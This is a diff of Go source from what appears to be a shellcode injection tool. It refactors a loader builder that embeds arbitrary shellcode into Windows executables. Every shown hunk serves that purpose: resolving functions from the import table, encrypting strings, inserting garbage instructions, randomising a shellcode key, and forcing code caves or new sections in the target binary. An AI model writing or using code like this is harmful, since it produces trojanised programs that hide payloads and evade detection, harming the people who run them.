@@ -126,6 +126,21 @@ func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
 			err = errors.New(fmt.Sprint(r))
 		}
 	}()
+	var src string
+	switch inj.arch {
+	case "386":
+		src = inj.getLoaderX86()
+	case "amd64":
+		src = inj.getLoaderX64()
+	}
+	asm, err := inj.buildLoaderASM(src, shellcode, false)
+	if err != nil {
+		return nil, err
+	}
+	return inj.assemble(asm)
+}
+
+func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (string, error) {
 	// make sure shellcode is 4 or 8 bytes alignment
 	var numPad int
 	switch inj.arch {
@@ -155,11 +170,15 @@ func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
 		MemRegionSize: memRegionSize,
 		ShellcodeSize: len(shellcode),
 
+		CodeCave:      inj.opts.ForceCodeCave,
+		ExtendSection: inj.opts.ForceExtendSection,
+		CreateSection: inj.opts.ForceCreateSection,
+
 		EndOfLoader: endOfShellcode,
 	}
-	err = inj.findProcFromIAT(ctx)
+	err := inj.findProcFromIAT(ctx)
 	if err != nil {
-		return nil, err
+		return "", err
 	}
 	inj.encryptStrings(ctx)
 	// update context
@@ -171,17 +190,18 @@ func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
 	inj.ctx.HasCreateThread = !ctx.LackCreateThread
 	inj.ctx.HasLoadLibraryA = hasLoadLibraryA
 	inj.ctx.HasLoadLibraryW = hasLoadLibraryW
-	// select and build loader source
-	var src string
-	switch inj.arch {
-	case "386":
-		src = inj.getLoaderX86()
-	case "amd64":
-		src = inj.getLoaderX64()
-	}
-	src, err = inj.buildLoaderSource(ctx, shellcode, src)
-	if err != nil {
-		return nil, err
+	if ins {
+		switch inj.arch {
+		case "386":
+			ctx.ShellcodeKey = inj.rand.Uint32()
+		case "amd64":
+			ctx.ShellcodeKey = inj.rand.Uint64()
+		}
+	} else {
+		src, err = inj.buildLoaderSource(ctx, shellcode, src)
+		if err != nil {
+			return "", err
+		}
 	}
 	// process loader template and assemble it
 	tpl, err := template.New("loader").Funcs(template.FuncMap{
@@ -191,14 +211,14 @@ func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
 		"igi": inj.insertGarbageInst,
 	}).Parse(src)
 	if err != nil {
-		return nil, fmt.Errorf("invalid loader template: %s", err)
+		return "", fmt.Errorf("invalid loader template: %s", err)
 	}
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
 	if err != nil {
-		return nil, fmt.Errorf("failed to build assembly source: %s", err)
+		return "", fmt.Errorf("failed to build assembly source: %s", err)
 	}
-	return inj.assemble(buf.String())
+	return buf.String(), nil
 }
 
 func (inj *Injector) getLoaderX86() string {
